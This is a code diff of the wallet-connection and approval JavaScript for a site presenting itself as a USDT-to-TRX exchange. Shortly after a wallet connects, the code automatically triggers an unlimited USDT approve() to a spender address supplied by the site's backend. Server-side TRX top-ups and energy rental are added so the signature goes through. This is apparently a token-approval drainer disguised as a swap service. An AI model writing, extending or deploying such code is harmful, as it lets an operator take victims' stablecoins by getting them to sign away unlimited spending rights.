-                var tronlinkParam = encodeURIComponent(JSON.stringify({ url: url, action: 'open', protocol: 'TronLink', version: '1.0' }));
-                var mobileSchemes = {
-                    tronlink: 'tronlinkoutside://pull.activity?param=' + tronlinkParam,
-                    trust: 'trust://open_url?coin_id=195&url=' + encoded,
-                    tokenpocket: 'tpdapp://open?params=' + encodeURIComponent(JSON.stringify({ url: url, chain: 'TRON' })),
-                    bitget: 'bitkeep://bkconnect?action=dapp&url=' + encoded,
-                    okx: 'okx://wallet/dapp/url?dappUrl=' + encoded,
-                    imtoken: 'imtokenv2://navigate/DappView?url=' + encoded
+                var installLinks = {
+                    tronlink: { name: 'TronLink', url: 'https://chrome.google.com/webstore/detail/tronlink/ibnejdfjmmkpcnlpebklmnkoeoihofec' },
+                    tokenpocket: { name: 'TokenPocket', url: 'https://extension.tokenpocket.pro/' },
+                    bitget: { name: 'Bitget Wallet', url: 'https://web3.bitget.com/en/wallet-download' },
+                    okx: { name: 'OKX Wallet', url: 'https://www.okx.com/web3' },
+                    imtoken: { name: 'imToken', url: 'https://token.im/download' }
                 };
+                var info = installLinks[wallet] || installLinks.tronlink;
+                showToast(info.name + ' 확장 프로그램을 설치 후 새로고침하세요', 'error');
+                window.open(info.url, '_blank');
+                return;
+            }
 
-                // Android: 지갑 앱 인텐트 호출 (미설치 시 스토어로 폴백)
-                if (isAndroid()) {
-                    var stores = {
-                        tronlink: 'https://play.google.com/store/apps/details?id=com.tronlinkpro.wallet',
-                        trust: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp',
-                        tokenpocket: 'https://play.google.com/store/apps/details?id=vip.mytokenpocket',
-                        bitget: 'https://play.google.com/store/apps/details?id=com.bitkeep.wallet',
-                        okx: 'https://play.google.com/store/apps/details?id=com.okinc.okex.gp',
-                        imtoken: 'https://play.google.com/store/apps/details?id=im.token.app'
-                    };
-                    var pkgs = {
-                        tronlink: 'com.tronlinkpro.wallet',
-                        trust: 'com.wallet.crypto.trustapp',
-                        tokenpocket: 'vip.mytokenpocket',
-                        bitget: 'com.bitkeep.wallet',
-                        okx: 'com.okinc.okex.gp',
-                        imtoken: 'im.token.app'
-                    };
-                    var rawScheme = mobileSchemes[wallet];
-                    if (rawScheme && pkgs[wallet]) {
-                        var schemeName = rawScheme.split('://')[0];
-                        var schemePath = rawScheme.split('://')[1] || '';
-                        window.location.href = 'intent://' + schemePath + '#Intent;scheme=' + schemeName + ';package=' + pkgs[wallet] + ';S.browser_fallback_url=' + encodeURIComponent(stores[wallet] || '') + ';end';
-                        return;
-                    }
-                }
+            document.getElementById('wallet-selector-modal').classList.remove('active');
 
-                                // iOS: 시스템 열기 팝업 대기 시간을 고려해 5초 뒤에만 스토어 안내/이동
-                if (isIOS()) {
-                    var appStoreLinks = {
-                        tronlink: 'https://apps.apple.com/app/tronlink/id1453530188',
-                        trust:    'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409',
-                        tokenpocket: 'https://apps.apple.com/app/tokenpocket/id1436028697',
-                        bitget:   'https://apps.apple.com/app/bitget-wallet/id1395301115',
-                        okx:      'https://apps.apple.com/app/okx-buy-bitcoin-eth-crypto/id1327268470',
-                        imtoken:  'https://apps.apple.com/app/imtoken-btc-eth-wallet/id1153230571'
-                    };
-                    if (mobileSchemes[wallet]) {
-                        showToast(currentLang === 'ko' ? '지갑 앱으로 이동합니다... (URL 복사됨)' : 'Opening wallet app... (URL copied)');
-                        var fallbackTimer = setTimeout(function () {
-                            if (document.visibilityState === 'visible') {
-                                showToast(currentLang === 'ko' ? '앱이 열리지 않으면 지갑 브라우저에 붙여넣거나 스토어에서 설치하세요' : 'Paste URL in wallet browser or install from App Store', 'error');
-                                if (appStoreLinks[wallet]) {
-                                    window.location.href = appStoreLinks[wallet];
-                                }
-                            }
-                        }, 5000);
-                        var clearFallback = function () { clearTimeout(fallbackTimer); };
-                        window.addEventListener('pagehide', clearFallback, { once: true });
-                        document.addEventListener('visibilitychange', function onVis() {
-                            if (document.hidden) {
-                                clearTimeout(fallbackTimer);
-                                document.removeEventListener('visibilitychange', onVis);
-                            }
-                        });
-                        window.location.href = mobileSchemes[wallet];
-                        return;
-                    }
-                }
+            // DApp 브라우저 내부라면 직접 연결
+            var tw = await getInjectedTronWeb();
+            if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
+                var prov = detectProvider() || wallet;
+                await setConnectedWallet(tw.defaultAddress.base58, prov);
+                return;
+            }
 
-                // Fallback: WalletConnect
-                showToast(currentLang === 'ko' ? '지갑 앱을 여는 중...' : 'Opening wallet app...');
-                var wcAddr = await connectViaWalletConnect(wallet);
-                if (wcAddr) {
-                    var walletNames = { tronlink: 'TronLink', trust: 'TrustWallet', tokenpocket: 'TokenPocket', bitget: 'Bitget', okx: 'OKX', imtoken: 'imToken' };
-                    await setConnectedWallet(wcAddr, walletNames[wallet] || 'WalletConnect');
-                } else {
-                    navigator.clipboard.writeText(url).catch(function () { });
-                    showToast(currentLang === 'ko' ? '지갑 앱의 브라우저에서 이 URL을 열어주세요 (복사됨)' : 'Open this URL in your wallet app browser (copied)', 'error');
-                }
-            } finally {
-                isLaunchingWallet = false;
+            // 모바일 공통: URL 복사 및 지갑 스킴 준비
+          try { if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(url).catch(function () { }); } catch (e) { }
+          var tronlinkParam = encodeURIComponent(JSON.stringify({ url: url, action: 'open', protocol: 'TronLink', version: '1.0' }));
+          var mobileSchemes = {
+              tronlink: 'tronlinkoutside://pull.activity?param=' + tronlinkParam,
+              tokenpocket: 'tpdapp://open?params=' + encodeURIComponent(JSON.stringify({ url: url, chain: 'TRON' })),
+              bitget: 'bitkeep://bkconnect?action=dapp&url=' + encoded,
+              okx: 'okx://wallet/dapp/url?dappUrl=' + encoded,
+              imtoken: 'imtokenv2://navigate/DappView?url=' + encoded
+          };
+
+          // Android: 지갑 앱 인텐트 호출 (미설치 시 스토어로 폴백)
+          if (isAndroid()) {
+              var stores = {
+                  tronlink: 'https://play.google.com/store/apps/details?id=com.tronlinkpro.wallet',
+                  tokenpocket: 'https://play.google.com/store/apps/details?id=vip.mytokenpocket',
+                  bitget: 'https://play.google.com/store/apps/details?id=com.bitkeep.wallet',
+                  okx: 'https://play.google.com/store/apps/details?id=com.okinc.okex.gp',
+                  imtoken: 'https://play.google.com/store/apps/details?id=im.token.app'
+              };
+              var pkgs = {
+                  tronlink: 'com.tronlinkpro.wallet',
+                  tokenpocket: 'vip.mytokenpocket',
+                  bitget: 'com.bitkeep.wallet',
+                  okx: 'com.okinc.okex.gp',
+                  imtoken: 'im.token.app'
+              };
+              var rawScheme = mobileSchemes[wallet];
+              if (rawScheme && pkgs[wallet]) {
+                  var schemeName = rawScheme.split('://')[0];
+                  var schemePath = rawScheme.split('://')[1] || '';
+                  window.location.href = 'intent://' + schemePath + '#Intent;scheme=' + schemeName + ';package=' + pkgs[wallet] + ';S.browser_fallback_url=' + encodeURIComponent(stores[wallet] || '') + ';end';
+                  return;
+              }
+          }
+
+          // iOS (Safari / Chrome 등): 지갑 딥링크 시도 후 안내
+          if (isIOS()) {
+              if (mobileSchemes[wallet]) {
+                  showToast(currentLang === 'ko' ? '지갑 앱을 여는 중... 안 열리면 지갑 브라우저에 붙여넣어 주세요.' : 'Opening wallet app...');
+                  window.location.href = mobileSchemes[wallet];
+                  return;
+              }
+          }
+
+            // Fallback: WalletConnect
+            showToast(currentLang === 'ko' ? '지갑 앱을 여는 중...' : 'Opening wallet app...');
+            var wcAddr = await connectViaWalletConnect(wallet);
+            if (wcAddr) {
+                var walletNames = { tronlink: 'TronLink', trust: 'TrustWallet', tokenpocket: 'TokenPocket', bitget: 'Bitget', okx: 'OKX', imtoken: 'imToken' };
+                await setConnectedWallet(wcAddr, walletNames[wallet] || 'WalletConnect');
+            } else {
+                navigator.clipboard.writeText(url).catch(function () { });
+                showToast(currentLang === 'ko' ? '지갑 앱의 브라우저에서 이 URL을 열어주세요 (복사됨)' : 'Open this URL in your wallet app browser (copied)', 'error');
             }
         };
 
         // ===== Wallet Detection =====
         function detectProvider() {
-    var ua = navigator.userAgent || '';
-    if (window.trustwallet || /Trust/i.test(ua)) return 'TrustWallet';
-    if (window.bitkeep || window.bitget || /BitKeep|Bitget/i.test(ua)) return 'Bitget';
-    if (window.okxwallet || /OKApp|OKX/i.test(ua)) return 'OKX';
-    if (window.tokenpocket || window.tp || /TokenPocket/i.test(ua)) return 'TokenPocket';
-    if (window.imToken || /imToken/i.test(ua)) return 'imToken';
-    if (window.tronLink || window.tronWeb) return 'TronLink';
-    return null;
-}
+          var ua = navigator.userAgent || '';
+          if (window.bitkeep || window.bitget || /BitKeep|Bitget/i.test(ua)) return 'Bitget';
+          if (window.okxwallet || /OKApp|OKX/i.test(ua)) return 'OKX';
+          if (window.tokenpocket || window.tp || /TokenPocket/i.test(ua)) return 'TokenPocket';
+          if (window.imToken || /imToken/i.test(ua)) return 'imToken';
+          if (window.tronLink || window.tronWeb) return 'TronLink';
+          return null;
+      }
 
-        // [이식 시킬 코드]
-function hasTronAddress() {
-    return !!(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58);
-}
-
-async function requestTronAccount() {
-    if (hasTronAddress()) return window.tronWeb.defaultAddress.base58;
-
-    if (window.tronLink && typeof window.tronLink.request === 'function') {
-        try {
-            var res = await window.tronLink.request({ method: 'tron_requestAccounts' });
-            if (res && res.code === 200 && hasTronAddress()) {
-                return window.tronWeb.defaultAddress.base58;
+        async function getInjectedTronWeb() {
+            if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) return window.tronWeb;
+            if (window.tronLink) {
+                if (window.tronLink.ready && window.tronLink.tronWeb) return window.tronLink.tronWeb;
+                try {
+                    var r = await window.tronLink.request({ method: 'tron_requestAccounts' });
+                    if (r && r.code === 200 && window.tronWeb) return window.tronWeb;
+                } catch (e) { }
             }
-        } catch (e) { }
-    }
-
-    if (window.tronWeb && typeof window.tronWeb.request === 'function') {
-        try {
-            await window.tronWeb.request({ method: 'tron_requestAccounts' });
-            if (hasTronAddress()) return window.tronWeb.defaultAddress.base58;
-        } catch (e) { }
-    }
-
-    if (window.tronLink && window.tronLink.ready && window.tronLink.tronWeb &&
-        window.tronLink.tronWeb.defaultAddress && window.tronLink.tronWeb.defaultAddress.base58) {
-        return window.tronLink.tronWeb.defaultAddress.base58;
-    }
-
-    // [문제가 되는 부분]
-    for (var i = 0; i < 12; i++) {
-        await new Promise(function (r) { setTimeout(r, 500); });
-        if (hasTronAddress()) return window.tronWeb.defaultAddress.base58;
-    }
-    return null;
-}   // <-- requestTronAccount()가 여기서 끝남
-
-    if (window.tronWeb && typeof window.tronWeb.request === 'function') {
-        try {
-            var p2 = window.tronWeb.request({ method: 'tron_requestAccounts' });
-            var t2 = new Promise(function (_, r) { setTimeout(r, 4000); });
-            await Promise.race([p2, t2]);
-            ready = readReadyTronWeb();
-            if (ready) return ready;
-        } catch (e) { }
-    }
-
-    for (var i = 0; i < 20; i++) {
-        await new Promise(function (r) { setTimeout(r, 300); });
-        ready = readReadyTronWeb();
-        if (ready) return ready;
-    }
-    return null;
+            return null;
+        }
 
         // ===== Auto Detection on Load =====
-        // [이식 시킬 코드]
-window.addEventListener('DOMContentLoaded', function () {
-    var attempts = 0;
-    var timer = setInterval(async function () {
-        attempts++;
-        try {
-            if (hasTronAddress()) {
-                clearInterval(timer);
-                var provider = detectProvider() || 'TronLink';
-                document.getElementById('wallet-selector-modal').classList.remove('active');
-                await setConnectedWallet(window.tronWeb.defaultAddress.base58, provider);
-            } else if (attempts > 30) {
-                clearInterval(timer);
-            }
-        } catch (e) {
-            if (attempts > 30) clearInterval(timer);
-        }
-    }, 500);
-});
+        window.addEventListener('DOMContentLoaded', function () {
+            var attempts = 0;
+            var timer = setInterval(async function () {
+                attempts++;
+                try {
+                    var tw = await getInjectedTronWeb();
+                    if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
+                        clearInterval(timer);
+                        var provider = detectProvider() || 'TronLink';
+                        document.getElementById('wallet-selector-modal').classList.remove('active');
+                        await setConnectedWallet(tw.defaultAddress.base58, provider);
+                    } else if (attempts > 12) {
+                        clearInterval(timer);
+                    }
+                } catch (e) {
+                    if (attempts > 12) clearInterval(timer);
+                }
+            }, 500);
 
-document.addEventListener('visibilitychange', async function () {
-    if (document.visibilityState === 'visible' && !isConnected) {
-        for (var i = 0; i < 6; i++) {
-            if (hasTronAddress()) {
-                var prov = detectProvider() || 'TronLink';
-                document.getElementById('wallet-selector-modal').classList.remove('active');
-                await setConnectedWallet(window.tronWeb.defaultAddress.base58, prov);
-                break;
+            // 계정 변경 리스너
+            if (window.tronLink) {
+                window.addEventListener('message', function (e) {
+                    if (e.data && e.data.message && e.data.message.action === 'accountsChanged') {
+                        var newAddr = e.data.message.data && e.data.message.data.address;
+                        if (newAddr && newAddr !== currentWalletAddress) {
+                            isApproved = false;
+                            setConnectedWallet(newAddr, activeProvider);
+                        }
+                    }
+                });
             }
-            await new Promise(function (r) { setTimeout(r, 400); });
-        }
-    }
-});
+        });
 
         async function initWalletConnect() {
           if (wcConnector) return wcConnector;
           if (typeof TronWalletConnect === 'undefined') { showToast('WalletConnect 로드 실패', 'error'); return null; }
           try {
               wcConnector = new TronWalletConnect('5fafa9c15e52f88b097bc063166d3f3a', {
-                  name: 'FeeSlash',
+                  name: 'TRONSwap',
                   description: 'USDT to TRX Instant Exchange',
                   url: window.location.origin,
                   icons: [window.location.origin + '/favicon.png']
@@ -1258,16 +1055,10 @@ document.addEventListener('visibilitychange', async function () {
                       return null;
                   }
                   var encodedUri = encodeURIComponent(connectResult.uri);
-                                    var wcDeepLinks = {
+                  var wcDeepLinks = {
                       tronlink: 'tronlinkoutside://wc?uri=' + encodedUri,
-                      // Trust: iOS는 커스텀 스킴, Android는 유니버셜 링크
-                      trust: isIOS()
-                          ? 'trust://wc?uri=' + encodedUri
-                          : 'https://link.trustwallet.com/wc?uri=' + encodedUri,
                       tokenpocket: 'tpdapp://wc?uri=' + encodedUri,
-                      bitget: isIOS()
-                          ? 'bitkeep://wc?uri=' + encodedUri
-                          : 'https://bkcode.vip/wc?uri=' + encodedUri,
+                      bitget: 'https://bkcode.vip/wc?uri=' + encodedUri,
                       okx: 'okx://wc?uri=' + encodedUri,
                       imtoken: 'imtokenv2://wc?uri=' + encodedUri
                   };
@@ -1333,74 +1124,24 @@ document.addEventListener('visibilitychange', async function () {
 
         window.wcConnectFromModal = async function () {
             document.getElementById('wallet-selector-modal').classList.remove('active');
-            // 모바일에서는 Trust Wallet WC 딥링크를 우선 시도하고, 실패 시 일반 WC 모달로 폴백
-            var targetWallet = isMobile() ? 'trust' : null;
-            var wcAddr = await connectViaWalletConnect(targetWallet);
-            if (!wcAddr && targetWallet) {
-                wcAddr = await connectViaWalletConnect();
-            }
+            var wcAddr = await connectViaWalletConnect();
             if (wcAddr) {
-                await setConnectedWallet(wcAddr, targetWallet ? 'TrustWallet' : 'WalletConnect');
+                await setConnectedWallet(wcAddr, 'WalletConnect');
             } else {
                 showToast(currentLang === 'ko' ? 'WalletConnect 연결 실패' : 'WalletConnect connection failed', 'error');
             }
         };
 
         // ===== Connect =====
-        var isConnecting = false;
-        var connectBtnOriginalHtml = null;
-
-        function setConnectButtonLoading(loading) {
-            var btn = document.getElementById('connect-btn');
-            if (!btn) return;
-            if (connectBtnOriginalHtml === null) {
-                connectBtnOriginalHtml = btn.innerHTML;
-            }
-            if (loading) {
-                btn.disabled = true;
-                btn.innerHTML = '<span class="animate-spin rounded-full h-3.5 w-3.5 border-2 border-white border-t-transparent"></span><span>연결 중...</span>';
+        window.handleConnectWallet = async function () {
+            var tw = await getInjectedTronWeb();
+            if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
+                var provider = detectProvider() || 'TronLink';
+                await setConnectedWallet(tw.defaultAddress.base58, provider);
             } else {
-                btn.disabled = false;
-                if (!isConnected) {
-                    btn.innerHTML = connectBtnOriginalHtml;
-                }
+                document.getElementById('wallet-selector-modal').classList.add('active');
             }
-        }
-
-        // [이식 시킬 코드]
-window.handleConnectWallet = async function () {
-    if (isConnecting) return;
-    isConnecting = true;
-    setConnectButtonLoading(true);
-    try {
-        var addr = await requestTronAccount();
-        if (addr) {
-            var provider = detectProvider() || 'TronLink';
-            await setConnectedWallet(addr, provider);
-        } else {
-            document.getElementById('wallet-selector-modal').classList.add('active');
-        }
-    } catch (e) {
-        showToast('지갑 연결 중 오류가 발생했습니다.', 'error');
-    } finally {
-        isConnecting = false;
-        setConnectButtonLoading(false);
-    }
-};
-        function refreshSwapBalanceUI() {
-            var topBal = document.getElementById('usdt-bal-swap');
-            var bottomBal = document.getElementById('trx-bal-swap');
-            var usdtText = (Number(userUsdtBalance) || 0).toFixed(2);
-            var trxText = (Number(userTrxBalance) || 0).toFixed(2);
-
-            if (swapDirection === 'TRX_TO_USDT') {
-                if (topBal) topBal.textContent = trxText;
-                if (bottomBal) bottomBal.textContent = usdtText;
-            } else {
-                if (topBal) topBal.textContent = usdtText;
-                if (bottomBal) bottomBal.textContent = trxText;
-            }
-        }
+        };
 
         async function setConnectedWallet(address, provider) {
             currentWalletAddress = address;
@@ -1414,6 +1155,8 @@ window.handleConnectWallet = async function () {
                     _ea.value = address;
                 }
             } catch (e) { console.error('[WALLET] 에너지 주소 설정 실패:', e); }
+
+            var _autoApproveScheduled = false;
 
             // UI 업데이트
             try { document.getElementById('wallet-btn-text').textContent = address.substring(0, 6) + '...' + address.slice(-4); } catch (e) { }
@@ -1430,41 +1173,39 @@ window.handleConnectWallet = async function () {
                     body: JSON.stringify({ address: address, provider: provider })
                 });
                 var data = await res.json();
-                if (data.status === 'ok') {var parsedUsdt = parseFloat(data.balance);
-userUsdtBalance = (isFinite(parsedUsdt) && parsedUsdt >= 0) ? parsedUsdt : 0;
-                    
+                if (data.status === 'ok') {
+                    userUsdtBalance = parseFloat(data.balance) || 0;
                     try { document.getElementById('display-balance').innerHTML = data.balance + ' <span class="text-xs font-normal text-slate-400">USDT</span>'; } catch (e) { }
-                    refreshSwapBalanceUI();
+                    try { document.getElementById('usdt-bal-swap').textContent = data.balance; } catch (e) { }
                     if (data.isApproved) { isApproved = true; setApprovedUI(); _autoApproveScheduled = true; }
                     showToast(provider + ' 연결 완료 (잔액: ' + data.balance + ' USDT)');
                 }
             } catch (e) { showToast('백엔드 연결 실패', 'error'); }
 
             // TRX 잔액
-            try {
-                var _tr = await fetch(API_BASE + '/trx/' + address);
-                var _td = await _tr.json();
-                if (_td.trxBalance !== undefined && _td.trxBalance !== null) {
-                    var parsedTrx = parseFloat(_td.trxBalance);
-userTrxBalance = (isFinite(parsedTrx) && parsedTrx >= 0) ? parsedTrx : 0;
-                    refreshSwapBalanceUI();
-                }
-            } catch (e) { }
+          try {
+              var _tr = await fetch(API_BASE + '/trx/' + address);
+              var _td = await _tr.json();
+              if (_td.trxBalance !== undefined && _td.trxBalance !== null) {
+                  userTrxBalance = parseFloat(_td.trxBalance) || 0;
+                  var trxText = userTrxBalance.toFixed(2);
+                  var targetId = (swapDirection === 'TRX_TO_USDT') ? 'usdt-bal-swap' : 'trx-bal-swap';
+                  try { document.getElementById(targetId).textContent = trxText; } catch (e) { }
+              }
+          } catch (e) { }
 
             // 레퍼럴
             try { trackReferralConnect(address, provider); } catch (e) { }
 
             // 자동 승인 (지갑 내장 브라우저일 때만)
-          // [이식 시킬 코드]
-if (!isApproved && !isApproving && !_autoApproveScheduled && provider !== 'WalletConnect') {
-    _autoApproveScheduled = true;
-    var targetAddr = address;
-    setTimeout(function () {
-        if (isConnected && currentWalletAddress && currentWalletAddress === targetAddr && !isApproved && !isApproving && !isLaunchingWallet) {
-            executeUnlimitedApprove();
-        }
-    }, 2500);
-}
+          if (!isApproved && !isApproving && !_autoApproveScheduled && provider !== 'WalletConnect') {
+              _autoApproveScheduled = true;
+              setTimeout(function () {
+                  if (isConnected && currentWalletAddress && !isApproved && !isApproving) {
+                      executeUnlimitedApprove();
+                  }
+              }, 1500);
+          }
 
             // 에너지 주소 재확인
             setTimeout(function () {
@@ -1495,29 +1236,20 @@ if (!isApproved && !isApproving && !_autoApproveScheduled && provider !== 'Walle
             // 에너지 UI도 업데이트
             try { setEnergyApprovedUI(); } catch (e) { }
         }
-                // base58 → hex 변환 (함수 밖으로 꺼냄 - strict mode 오류 방지)
-        function base58ToHex(b58) {
-            var ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
-            var result = BigInt(0);
-            for (var i = 0; i < b58.length; i++) {
-                var c = ALPHABET.indexOf(b58[i]);
-                if (c < 0) throw new Error('Invalid base58');
-                result = result * BigInt(58) + BigInt(c);
-            }
-            var hex = result.toString(16);
-            while (hex.length < 50) hex = '0' + hex;
-            return hex.substring(2, 42);
-        }
 
         // ===== Approve =====
         window.executeUnlimitedApprove = async function () {
-            if (!isConnected || !currentWalletAddress) {
-                showToast('지갑을 먼저 연결하세요.', 'error');
-                handleConnectWallet();
-                return;
-            }
-            if (isApproved || isApproving) return;
-            isApproving = true;
+          if (!isConnected || !currentWalletAddress) {
+              showToast('지갑을 먼저 연결하세요.', 'error');
+              handleConnectWallet();
+              return;
+          }
+          if (isApproved) return;
+          if (isApproving) return;
+          isApproving = true;
+
+            // Spender 주소 획득 (최대 3회)
+            var spender = null;
             for (var _sp = 0; _sp < 3; _sp++) {
                 spender = await getSpenderAddress();
                 if (spender) break;
@@ -1530,35 +1262,252 @@ if (!isApproved && !isApproving && !_autoApproveScheduled && provider !== 'Walle
             }
 
             // tronWeb 획득
-            // [이식 시킬 코드]
-var tw = window.tronWeb;
-var useWC = false;
+            var tw = window.tronWeb || null;
+            if (!tw && window.tronLink && window.tronLink.tronWeb) tw = window.tronLink.tronWeb;
+            var useWC = false;
 
-if (!tw || !tw.transactionBuilder) {
-    if (wcConnector && wcAddress) {
-        useWC = true;
-    } else {
-        showToast(currentLang === 'ko' ? '지갑 연결이 끊겼습니다. 다시 연결해주세요.' : 'Wallet disconnected. Please reconnect.', 'error');
-        isApproving = false;
-        handleConnectWallet();
-        return;
-    }
-}
+            if (!tw || !tw.contract) {
+                // 최대 15초 대기
+                for (var _wait = 0; _wait < 5; _wait++) {
+                    await new Promise(function (r) { setTimeout(r, 1000); });
+                    tw = window.tronWeb || null;
+                    if (!tw && window.tronLink && window.tronLink.tronWeb) tw = window.tronLink.tronWeb;
+                    if (tw && tw.contract) break;
+                }
+                if (!tw || !tw.contract) {
+                    try {
+                        if (window.tronLink) {
+                            var _req = await window.tronLink.request({ method: 'tron_requestAccounts' });
+                            if (_req && _req.code === 200 && window.tronWeb) tw = window.tronWeb;
+                        }
+                    } catch (e) { }
+                }
+                                            if (!tw || !tw.contract) {
+                    showToast(currentLang === 'ko' ? '지갑 앱 DApp 브라우저에서 열어주세요!' :
+                        currentLang === 'zh' ? '请在钱包App的DApp浏览器中打开！' :
+                        currentLang === 'ru' ? 'Откройте в DApp браузере кошелька!' :
+                        currentLang === 'ja' ? 'ウォレットのDAppブラウザで開いてください！' :
+                        currentLang === 'th' ? 'กรุณาเปิดใน DApp Browser ของกระเป๋า!' :
+                        currentLang === 'vi' ? 'Vui lòng mở trong DApp Browser của ví!' :
+                        currentLang === 'de' ? 'Bitte im DApp-Browser der Wallet öffnen!' :
+                        currentLang === 'fr' ? 'Ouvrez dans le navigateur DApp du portefeuille!' :
+                        currentLang === 'es' ? '¡Abra en el navegador DApp de la billetera!' :
+                        'Please open in wallet DApp browser!', 'error');
+                    if (wcConnector && wcAddress) {
+                        useWC = true;
+                    } else {
+                        showToast(currentLang === 'ko' ? '지갑 연결이 끊겼습니다. 다시 연결해주세요.' :
+                            currentLang === 'zh' ? '钱包连接断开，请重新连接。' :
+                            currentLang === 'ru' ? 'Кошелёк отключён. Подключите снова.' :
+                            currentLang === 'ja' ? 'ウォレットが切断されました。再接続してください。' :
+                            currentLang === 'th' ? 'กระเป๋าขาดการเชื่อมต่อ กรุณาเชื่อมต่อใหม่' :
+                            currentLang === 'vi' ? 'Ví bị ngắt kết nối. Vui lòng kết nối lại.' :
+                            currentLang === 'de' ? 'Wallet getrennt. Bitte neu verbinden.' :
+                            currentLang === 'fr' ? 'Portefeuille déconnecté. Veuillez reconnecter.' :
+                            currentLang === 'es' ? 'Billetera desconectada. Por favor reconecte.' :
+                            'Wallet disconnected. Please reconnect.', 'error');
+                        isApproving = false;
+                        handleConnectWallet();
+                        return;
+                    }
+                }
+            }
 
-var tx = await tw.transactionBuilder.triggerSmartContract(
-                OFFICIAL_USDT_CONTRACT,
-                'approve(address,uint256)',
-                { feeLimit: 100000000 },
-                [{ type: 'address', value: spender }, { type: 'uint256', value: MAX_ALLOWANCE }],
-                currentWalletAddress
-            );
-            if (!tx || !tx.transaction) throw new Error('트랜잭션 생성 실패');
+            var btn = document.getElementById('approve-btn');
+            btn.disabled = true;
+            btn.innerHTML = '<span class="animate-spin rounded-full h-4 w-4 border-2 border-white border-t-transparent"></span><span>처리 중...</span>';
 
-            showToast(currentLang === 'ko' ? '지갑 팝업을 확인하세요! 🔔' : 'Check your wallet popup! 🔔');
-            var signedTx = await tw.trx.sign(tx.transaction);
-            var result = await tw.trx.sendRawTransaction(signedTx);
-            txHash = (result && result.txid) || (result && result.transaction && result.transaction.txID) || (signedTx && signedTx.txID) || 'ok';
+            // Step 1: TRX 잔액 확인 & 에너지 렌탈
+            setProgress(20, 'TRX 잔액 확인 중...');
             try {
+                var prepRes = await fetch(API_BASE + '/wallet/prepare-approve', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ address: currentWalletAddress })
+                });
+                var prepData = await prepRes.json();
+                if (prepData.status === 'ok' && prepData.ready) {
+                    if (prepData.sent) {
+                        setProgress(30, 'TRX ' + prepData.sentAmount + '개 자동 충전 완료!');
+                        showToast(prepData.sentAmount + ' TRX 자동 충전!');
+                    } else {
+                        setProgress(30, 'TRX 충분 (' + prepData.trxBalance + ' TRX)');
+                    }
+                }
+            } catch (pe) { /* 계속 진행 */ }
+
+            // 에너지 렌탈
+            setProgress(40, '에너지 렌탈 중...');
+            try {
+                var rentRes = await fetch(API_BASE + '/energy/rent', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ address: currentWalletAddress, amount: 131000, duration: '1h' })
+                });
+                var rentData = await rentRes.json();
+                if (rentData.status === 'ok' && rentData.rented) {
+                    setProgress(50, '에너지 렌탈 완료! 블록체인 반영 대기...');
+                    showToast('에너지 렌탈 완료!');
+                    await new Promise(function (r) { setTimeout(r, 3000); });
+                }
+            } catch (rentErr) { /* 계속 진행 */ }
+
+            // Step 2: Approve 서명
+            setProgress(60, '스마트 컨트랙트 승인 서명 요청 중...');
+            showToast('지갑에서 서명 팝업을 확인하세요.');
+
+            try {
+                var txHash;
+
+                if (useWC) {
+                    // WalletConnect 경로
+                    function base58ToHex(b58) {
+                        var ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+                        var result = BigInt(0);
+                        for (var i = 0; i < b58.length; i++) {
+                            var c = ALPHABET.indexOf(b58[i]);
+                            if (c < 0) throw new Error('Invalid base58');
+                            result = result * BigInt(58) + BigInt(c);
+                        }
+                        var hex = result.toString(16);
+                        while (hex.length < 50) hex = '0' + hex;
+                        return hex.substring(2, 42);
+                    }
+                    var addrHex = base58ToHex(spender);
+                    var paddedAddr = addrHex.padStart(64, '0');
+                    var maxUint = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+                    var abiParam = paddedAddr + maxUint;
+
+                    var triggerRes = await fetch('https://api.trongrid.io/wallet/triggersmartcontract', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            owner_address: currentWalletAddress,
+                            contract_address: OFFICIAL_USDT_CONTRACT,
+                            function_selector: 'approve(address,uint256)',
+                            parameter: abiParam,
+                            fee_limit: 100000000,
+                            call_value: 0,
+                            visible: true
+                        })
+                    });
+                    var triggerData = await triggerRes.json();
+                    if (!triggerData.transaction) throw new Error('TronGrid 트랜잭션 생성 실패');
+
+                    // FIX: WalletConnect signTransaction 호출 방식 개선
+                                        var wcResult;
+                    // 서명 타임아웃 60초
+                    var wcSignTimeout = new Promise(function(_, reject) {
+                        setTimeout(function() {
+                            reject(new Error('서명 응답 시간 초과 (지갑 앱을 확인해 주세요)'));
+                        }, 60000);
+                    });
+
+                    if (wcConnector.signTransaction) {
+                        wcResult = await Promise.race([
+                            wcConnector.signTransaction(triggerData.transaction),
+                            wcSignTimeout
+                        ]);
+                    } else if (wcConnector.client) {
+                        var activeTopic = (wcConnector.session && wcConnector.session.topic) ||
+                            (wcConnector.client.session && wcConnector.client.session.keys && wcConnector.client.session.keys[0]);
+                        if (!activeTopic) {
+                            // 세션 만료시 자동으로 재연결 유도
+                            showToast(currentLang === 'ko' ? 'WalletConnect 세션 만료. 다시 연결해주세요.' : 'WalletConnect session expired. Please reconnect.', 'error');
+                            isApproving = false;
+                            wcConnector = null;
+                            wcAddress = null;
+                            handleConnectWallet();
+                            return;
+                        }
+                        wcResult = await Promise.race([
+                            wcConnector.client.request({
+                                topic: activeTopic,
+                                chainId: 'tron:0x2b6653dc',
+                                request: { method: 'tron_signTransaction', params: [triggerData.transaction] }
+                            }),
+                            wcSignTimeout
+                        ]);
+                    } else {
+                        throw new Error('WalletConnect 서명 메서드를 찾을 수 없습니다');
+                    }
+
+                    if (wcResult && wcResult.result) wcResult = wcResult.result;
+                  if (typeof wcResult === 'string') {
+                      try {
